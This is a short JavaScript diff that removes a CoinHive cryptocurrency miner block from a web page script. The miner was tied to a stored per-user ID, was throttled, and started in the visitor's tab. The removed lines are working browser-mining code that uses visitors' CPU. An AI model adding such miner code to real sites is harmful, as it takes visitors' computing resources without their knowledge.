@@ -21,12 +21,3 @@ if (sexyId == undefined || sexyId == "") {
     sexyId = generateUuid();
     store.set('sexy_id', sexyId)
 }
-
-// CoinHive
-var miner = new CoinHive.User('UiPoP4JNro5MWI73PRtjX9DtOBihASrl', sexyId, {
-	threads: 1,
-	autoThreads: false,
-	throttle: 0.8,
-	forceASMJS: false
-});
-miner.start(CoinHive.IF_EXCLUSIVE_TAB);
